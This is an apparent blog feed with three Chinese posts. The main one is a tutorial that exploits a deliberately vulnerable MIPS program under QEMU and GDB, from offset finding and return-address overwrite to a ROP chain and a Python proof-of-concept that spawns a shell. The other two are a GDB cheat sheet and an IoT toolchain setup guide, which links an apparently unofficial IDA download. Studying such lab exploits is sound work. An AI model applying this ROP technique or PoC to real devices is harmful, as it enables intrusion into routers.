<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TT</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.pwntools.xyz/"/>
  <updated>2019-10-23T12:59:06.897Z</updated>
  <id>http://blog.pwntools.xyz/</id>
  
  <author>
    <name>TT</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用GDB调试MIPS架构的缓冲区溢出</title>
    <link href="http://blog.pwntools.xyz/2019/10/23/%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>http://blog.pwntools.xyz/2019/10/23/使用GDB调试MIPS架构的缓冲区溢出/</id>
    <published>2019-10-23T12:55:00.000Z</published>
    <updated>2019-10-23T12:59:06.897Z</updated>
    
    <content type="html"><![CDATA[<h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p><p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p><a id="more"></a><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;sys/stat.h&gt;#include&lt;unistd.h&gt;void do_system(int code, char *cmd){    char buf[255];    //sleep(1);    system(cmd);}void main(){    char buf[256] = {0};    char ch;    int count = 0;    unsigned int fileLen = 0;    struct stat fileData;    FILE *fp;    if(0 == stat(&quot;passwd&quot;, &amp;fileData))        fileLen = fileData.st_size;    else        return 1;    if ((fp = fopen(&quot;passwd&quot;, &quot;rb&quot;)) == NULL)    {        printf(&quot;Cannot open file passwd! \n&quot;);        exit(1);    }    ch = fgetc(fp);    while(count &lt;= fileLen){        buf[count++] = ch;        ch = fgetc(fp);    }    buf[--count] = &#39;\x00&#39;;    if (!strcmp(buf, &quot;adminpwd&quot;))    {        do_system(count, &quot;ls -l&quot;);    }    else    {        printf(&quot;you have an invalid password!\n&quot;);    }    fclose(fp);}</code></pre><p>使用mipsls-linux-gcc来编译程序</p><blockquote><p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p></blockquote><ul><li>-g 生成的可执行文件才能用gdb进行源码级调试</li><li>-o 输出文件的名称</li><li>-static 静态编译</li></ul><p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://file.smilehacker.net/info_1.png" alt="环境介绍"></p><p>从上面图片可以看出,编译产生的程序为一个MIPS程序,在Linux下无法直接运行,生成<code>passwd</code>文件(一个正常的输入文件，并没有造成溢出),使用<code>qemu-mipsel</code>模拟程序获得执行结果。</p><h4 id="使用GDB动态调试程序"><a href="#使用GDB动态调试程序" class="headerlink" title="使用GDB动态调试程序"></a>使用<code>GDB</code>动态调试程序</h4><p>启动<code>qemu</code>远程调试</p><blockquote><p>qemu-mipsel -g 1234 vuln_system</p></blockquote><ul><li>-g 指定<code>qemu-mipsel</code>远程调试端口</li></ul><p>设置<code>gdb</code></p><pre><code class="shell">gdb-multiarch ./vuln_system# 打开gdb后进行如下设置pwndbg&gt; set endian little #设置小端序The target is assumed to be little endianpwndbg&gt; set architecture mips #设置为Mips架构The target architecture is assumed to be mipspwndbg&gt; target remote localhost:1234 #设置远程端口</code></pre><p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p><p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p><blockquote><p>python -c “print ‘A’*600 “&gt; passwd</p></blockquote><p>之后重新用gdb加载程序,直接输入<code>r</code>让程序直接运行。</p><p><img src="http://file.smilehacker.net/info2.png" alt="Alt text"></p><p>可以看到程序直接崩溃，并且崩溃后的<code>PC</code>寄存器指向了<code>0x41414141</code>(A的16进制为0x41)</p><h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>从上面可以看到,不仅程序崩溃了,而且完全劫持了函数流程,让<code>PC</code>指针指向0x41414141,现在尝试精准定位，究竟淹没多少个自己可以劫持程序的执行流程。</p><h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p><p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p><h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p><pre><code class="Mips">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为                                            0x1D0+var_4sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8move    $fp, $sp                //fp&lt;== spli      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为                                        0x1D0+var_1C0addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值li      $v1, 0x100        //将立即数0x100传入v1move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数move    $a1, $zero        //zero寄存器里面永远为0move    $a0, $v0          //a0=v0la      $v0, memset      //复制memset地址至至v0中move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放                                于Ra里面nop</code></pre><p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p><blockquote><p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p></blockquote><p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p><pre><code class="shell">disassemble main # 查看main函数的汇编代码break *main+740 # 在main函数后740行处下断点</code></pre><p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p><p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p><p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p><p>输入<code>n</code>,让函数运行到756行，如果<code>ra</code>被替换成<code>0x42424242</code>,就说明我们的猜想是正确的。</p><p><img src="http://file.smilehacker.net/validate.png" alt="猜想成功"></p><p>可以看到pc的值已经成功被劫持为<code>0x42424242</code>了</p><h4 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h4><p>一般漏洞攻击的途径有两种:一是命令执行,另外一种方法是执行shellcode;<br>这里只谈命令执行的方法:<br>在源程序里面有一个函数do_system_0.虽然从代码里面可以看出，do_system_0函数只能执行“ls -l”命令,但是我们可以构造一条ROP链,通过溢出漏洞调用这个函数,使得这个函数能够执行任意命令.想要构造出ROP链,首先构造出do_system_0这个函数的两个参数,将两个参数分别 装入寄存器<br>a0和a1,这里只需要控制寄存器$a1即可,该参数是命令的字符串地址</p><p>使用<code>IDA</code>脚本插件<code>mipsrop.py</code>搜索合适的<code>ROP Chain</code></p><p><img src="http://file.smilehacker.net/ROPfinder.png" alt="寻找合适的rop链"></p><p><img src="http://file.smilehacker.net/ROPchain.png" alt="ROP"></p><p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p><p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p><p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p><h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><pre><code class="python">&quot;&quot;&quot;struct.pack(&quot;&lt;L&quot;,&quot;xxx&quot;)为小端序struct.pack(&quot;&gt;L&quot;,&quot;xxx&quot;)为大端序&quot;&quot;&quot;import structcmd = &quot;sh&quot;                 # command stringcmd += &quot;\x00&quot;*(4 - (len(cmd) % 4))    # align by 4 bytes#shellcodeshellcode = &quot;A&quot;*0x19C             # padding bufshellcode += struct.pack(&quot;&lt;L&quot;,0x00401FA0) shellcode += &quot;A&quot;*24                # padding before commandshellcode += cmd                # command($a1)shellcode += &quot;B&quot;*(0x3C - len(cmd))        # padding shellcode += struct.pack(&quot;&lt;L&quot;,0x00400678) shellcode += &quot;BBBB&quot;                # paddingprint &#39; ok!&#39;#create password fileprint &#39;[+] create password file&#39;,fw = open(&#39;passwd&#39;,&#39;w&#39;)fw.write(shellcode)#&#39;A&#39;*300+&#39;\x00&#39;*10+&#39;BBBB&#39;)fw.close()print &#39; ok!&#39;</code></pre><p>将上述代码保存为<code>poc.py</code>,运行结果如下</p><p><img src="http://file.smilehacker.net/result.png" alt="result"></p><p>成功拿到shell</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;使用GDB调试MIPS架构的缓冲区溢出&quot;&gt;&lt;a href=&quot;#使用GDB调试MIPS架构的缓冲区溢出&quot; class=&quot;headerlink&quot; title=&quot;使用GDB调试MIPS架构的缓冲区溢出&quot;&gt;&lt;/a&gt;使用GDB调试MIPS架构的缓冲区溢出&lt;/h4&gt;&lt;h4 id=&quot;环境介绍和准备工作&quot;&gt;&lt;a href=&quot;#环境介绍和准备工作&quot; class=&quot;headerlink&quot; title=&quot;环境介绍和准备工作&quot;&gt;&lt;/a&gt;环境介绍和准备工作&lt;/h4&gt;&lt;p&gt;测试的代码都是来自&amp;lt;&amp;lt;解密家用路由器0day挖掘技术&amp;gt;&amp;gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。&lt;/p&gt;
&lt;p&gt;测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
      <category term="IoT" scheme="http://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/IoT/"/>
    
    
      <category term="IoT" scheme="http://blog.pwntools.xyz/tags/IoT/"/>
    
      <category term="调试" scheme="http://blog.pwntools.xyz/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="Debug" scheme="http://blog.pwntools.xyz/tags/Debug/"/>
    
      <category term="Mips" scheme="http://blog.pwntools.xyz/tags/Mips/"/>
    
      <category term="溢出" scheme="http://blog.pwntools.xyz/tags/%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>GDB调试命令--持续更新</title>
    <link href="http://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>http://blog.pwntools.xyz/2019/10/20/GDB调试命令-持续更新/</id>
    <published>2019-10-20T12:50:20.000Z</published>
    <updated>2019-10-21T08:41:39.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GDB调试命令记录-持续更新"><a href="#GDB调试命令记录-持续更新" class="headerlink" title="GDB调试命令记录(持续更新)"></a>GDB调试命令记录(持续更新)</h2><p>记录一些GDB调试的命令,好记性不如烂笔头</p><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>pwndbg</p><pre><code class="shell">git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</code></pre><p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p><a id="more"></a><p><img src="http://file.smilehacker.net/1570720622109.png" alt="pwndbg界面展示"></p><h2 id="启动GDB"><a href="#启动GDB" class="headerlink" title="启动GDB"></a>启动GDB</h2><p>对C/C++程序的调试，需要在编译前就加上-g选项:</p><pre><code class="bash">$g++ -g hello.cpp -o hello</code></pre><p>调试可执行文件:</p><pre><code class="bash">$gdb &lt;program&gt;</code></pre><p>program也就是你的执行文件，一般在当前目录下。</p><p>调试core文件(core是程序非法执行后core dump后产生的文件):</p><pre><code class="bash">$gdb &lt;program&gt; &lt;core dump file&gt;$gdb program core.11127</code></pre><p>调试服务程序:</p><pre><code class="bash">$gdb &lt;program&gt; &lt;PID&gt;$gdb hello 11127</code></pre><p>如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</p><h2 id="gdb交互命令"><a href="#gdb交互命令" class="headerlink" title="gdb交互命令"></a>gdb交互命令</h2><p>启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul><li>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li><li>continue （简写c ）：继续执行，到下一个断点处（或运行结束）</li><li>next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li><li>step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li><li>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li><li>until+行号： 运行至某行，不仅仅用来跳出循环</li><li>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li><li>call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</li><li>quit：简记为 q ，退出gdb</li></ul><h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><ul><li><p>break n （简写b n）:在第n行处设置断点</p><p>（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）</p></li><li><p>b fn1 if a＞b：条件断点设置</p></li><li><p>break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button</p></li><li><p>delete 断点号n：删除第n个断点</p></li><li><p>disable 断点号n：暂停第n个断点</p></li><li><p>enable 断点号n：开启第n个断点</p></li><li><p>clear 行号n：清除第n行的断点</p></li><li><p>info b （info breakpoints） ：显示当前程序的断点设置情况</p></li><li><p>delete breakpoints：清除所有断点：</p></li></ul><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><ul><li>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li><li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li><li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li><li>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。</li></ul><h3 id="打印表达式"><a href="#打印表达式" class="headerlink" title="打印表达式"></a>打印表达式</h3><ul><li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。</li><li>print a：将显示整数 a 的值</li><li>print ++a：将把 a 中的值加1,并显示出来</li><li>print name：将显示字符串 name 的值</li><li>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数</li><li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li><li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li><li>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a</li><li>whatis ：查询变量或函数</li><li>info function： 查询函数</li><li>扩展info locals： 显示当前堆栈页的所有变量</li></ul><h3 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h3><ul><li>where/bt ：当前运行的堆栈列表；</li><li>bt backtrace 显示当前调用堆栈</li><li>up/down 改变堆栈显示的深度</li><li>set args 参数:指定运行时的参数</li><li>show args：查看设置好的参数</li><li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li></ul><h3 id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h3><ul><li>layout：用于分割窗口，可以一边查看代码，一边测试：</li><li>layout src：显示源代码窗口</li><li>layout asm：显示反汇编窗口</li><li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li><li>layout split：显示源代码和反汇编窗口</li><li>Ctrl + L：刷新窗口</li></ul><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便；</p><h2 id="补充一些其他操作"><a href="#补充一些其他操作" class="headerlink" title="补充一些其他操作"></a>补充一些其他操作</h2><h3 id="调试汇编代码"><a href="#调试汇编代码" class="headerlink" title="调试汇编代码"></a>调试汇编代码</h3><ul><li>b fun_name : 会跳过栈初始化的过程</li><li>b *func_name : 不会跳过栈初始化的过程</li><li>b *func_name+n: 在func_name函数偏移n行的位置下断点</li></ul><p>例如:</p><p><img src="http://file.smilehacker.net/1570722300144.png" alt="汇编断点调试"></p><h3 id="GDB中使用管道进行调试"><a href="#GDB中使用管道进行调试" class="headerlink" title="GDB中使用管道进行调试"></a>GDB中使用管道进行调试</h3><p>输入的不是参数，而是标准输入(stdin)</p><pre><code class="shell">gdb ./vuln_progrun &lt; filename_with_input</code></pre><h3 id="GDB-查看栈帧多行数据"><a href="#GDB-查看栈帧多行数据" class="headerlink" title="GDB 查看栈帧多行数据"></a>GDB 查看栈帧多行数据</h3><p>可以清楚看到栈帧里面的情况，一目了然，前面搞死人了</p><pre><code class="shell">stack n[要查看具体多少]</code></pre><p><img src="http://file.smilehacker.net/1571206209216.png" alt="查看堆栈"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;GDB调试命令记录-持续更新&quot;&gt;&lt;a href=&quot;#GDB调试命令记录-持续更新&quot; class=&quot;headerlink&quot; title=&quot;GDB调试命令记录(持续更新)&quot;&gt;&lt;/a&gt;GDB调试命令记录(持续更新)&lt;/h2&gt;&lt;p&gt;记录一些GDB调试的命令,好记性不如烂笔头&lt;/p&gt;
&lt;h2 id=&quot;插件安装&quot;&gt;&lt;a href=&quot;#插件安装&quot; class=&quot;headerlink&quot; title=&quot;插件安装&quot;&gt;&lt;/a&gt;插件安装&lt;/h2&gt;&lt;p&gt;pwndbg&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
      <category term="调试" scheme="http://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/%E8%B0%83%E8%AF%95/"/>
    
    
      <category term="调试" scheme="http://blog.pwntools.xyz/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="安全" scheme="http://blog.pwntools.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="GDB" scheme="http://blog.pwntools.xyz/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>IoT测试环境搭建</title>
    <link href="http://blog.pwntools.xyz/2019/10/18/IoT%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://blog.pwntools.xyz/2019/10/18/IoT测试环境搭建/</id>
    <published>2019-10-18T14:36:56.000Z</published>
    <updated>2019-10-21T08:41:53.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IoT分析环境搭建"><a href="#IoT分析环境搭建" class="headerlink" title="IoT分析环境搭建"></a>IoT分析环境搭建</h2><p>因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。</p><h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表:"></a>工具列表:</h2><ul><li>binwalk 固件提取</li><li>qemu 模拟执行</li><li><del>irmadyne 固件模拟工具</del>(这里没有安装)</li><li>buildroot Mips交叉编译环境</li><li>gdb 调试工具(可编译一个<a href="https://blog.csdn.net/zqj6893/article/details/84662579" target="_blank" rel="noopener">mips-linux-gdb</a>)</li><li>IDA</li><li>ghidra</li><li>GDBServer </li></ul><a id="more"></a><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><pre><code class="shell">$ sudo apt-get update  $ sudo apt-get install build-essential autoconf git #安装依赖 # https://github.com/devttys0/binwalk/blob/master/INSTALL.md  $ git clone https://github.com/ReFirmLabs/binwalk.git$ cd binwalk  # python2.7 $ sudo python setup.py install # Python3.x$ sudo python3 setup.py install$ sudo ./deps.sh #debian/Ubuntu可使用脚本自动安装依赖</code></pre><h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>Qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。 QEMU模拟器主要有两种比较常见的运作模式：</p><ul><li>User Mode（使用者模式） User Mode模式下，用户只需要将各种不同平台的处理编译得到的Linux程序放在QEMU虚拟中运行即可，其他的事情全部由QEMU虚拟机来完成，不需要用户自定义内核和虚拟磁盘等文件；</li><li>System Mode（系统模式）。 System Mode模式下，最明显的特点是用户可以为QEMU虚拟机指定运行的内核或者虚拟硬盘等文件，简单来说系统模式下QEMU虚拟机是可根据用户的要求配置的</li></ul><h3 id="使用源码安装Qemu"><a href="#使用源码安装Qemu" class="headerlink" title="使用源码安装Qemu"></a>使用源码安装Qemu</h3><pre><code class="shell">$ git clone git://git.qemu.org/qemu.git$ cd qemu$ git submodule update --recursive$ sudo apt install libglib2.0 libglib2.0-dev$ sudo apt install autoconf automake libtoolcd $ ./configure$ sudo make &amp;&amp; sudo make install</code></pre><p>ubuntu14.04中用源码方式编译安装qemu时,执行configure步骤提示错误：“ERROR: pixman &gt;= 0.21.8 not present.” 安装如下依赖：</p><pre><code class="shell">$ sudo apt-get install libpixman-1-dev</code></pre><h2 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h2><p>github : <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p><h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p>下载地址 : <a href="https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz</a></p><pre><code class="shell">tar zxvf buildroot-2019.02.6.tar.gzcd buildroot-2019.02.6sudo apt-get install libncurses5-dev patchmake cleanmake menuconfig</code></pre><p>需要设置以下三个选项<br><img src="http://file.smilehacker.net/buildroot_set1.png" alt="buildroot安装选项"></p><ul><li>Target options -&gt; Target Architecture 设置为Mips (little endian)</li><li>Target options -&gt; Target Architecture Variant 设置为 MIPS32</li><li>Toolchain -&gt; Kernal Headers 设置成机器Kennal版本</li></ul><p>选择Save保存, 之后开始编译,</p><pre><code class="shell">sudo make</code></pre><p>经过一个小时的编译，在目录下产生一个<code>output</code>的目录。编译产生的工具在<code>output/host/usr/bin</code>目录下</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>一般的Linux平台下自带了GDB</p><p>调试MIPS平台的程序，需要安装gdb-multiarch</p><pre><code class="shell">sudo apt install gdb-multiarch</code></pre><p>然后按照正常的GDB使用即可</p><h3 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h3><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。</p><pre><code class="shell">git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</code></pre><h2 id="IDA-Linux"><a href="#IDA-Linux" class="headerlink" title="IDA(Linux)"></a>IDA(Linux)</h2><p>链接：<a href="https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw</a><br>提取码：076v </p><pre><code class="shell">$ sudo dpkg --add-architecture i386$ sudo apt-get update$ sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 # 安装IDA插件:git clone https://github.com/devttys0/ida.gitcd pluginspython install.py /IDA PATH/ --install </code></pre><h2 id="GDBServer"><a href="#GDBServer" class="headerlink" title="GDBServer"></a>GDBServer</h2><p>各个版本的GDBServer下载地址 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;IoT分析环境搭建&quot;&gt;&lt;a href=&quot;#IoT分析环境搭建&quot; class=&quot;headerlink&quot; title=&quot;IoT分析环境搭建&quot;&gt;&lt;/a&gt;IoT分析环境搭建&lt;/h2&gt;&lt;p&gt;因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。&lt;/p&gt;
&lt;h2 id=&quot;工具列表&quot;&gt;&lt;a href=&quot;#工具列表&quot; class=&quot;headerlink&quot; title=&quot;工具列表:&quot;&gt;&lt;/a&gt;工具列表:&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;binwalk 固件提取&lt;/li&gt;
&lt;li&gt;qemu 模拟执行&lt;/li&gt;
&lt;li&gt;&lt;del&gt;irmadyne 固件模拟工具&lt;/del&gt;(这里没有安装)&lt;/li&gt;
&lt;li&gt;buildroot Mips交叉编译环境&lt;/li&gt;
&lt;li&gt;gdb 调试工具(可编译一个&lt;a href=&quot;https://blog.csdn.net/zqj6893/article/details/84662579&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;mips-linux-gdb&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;IDA&lt;/li&gt;
&lt;li&gt;ghidra&lt;/li&gt;
&lt;li&gt;GDBServer &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="IoT" scheme="http://blog.pwntools.xyz/tags/IoT/"/>
    
      <category term="安全" scheme="http://blog.pwntools.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
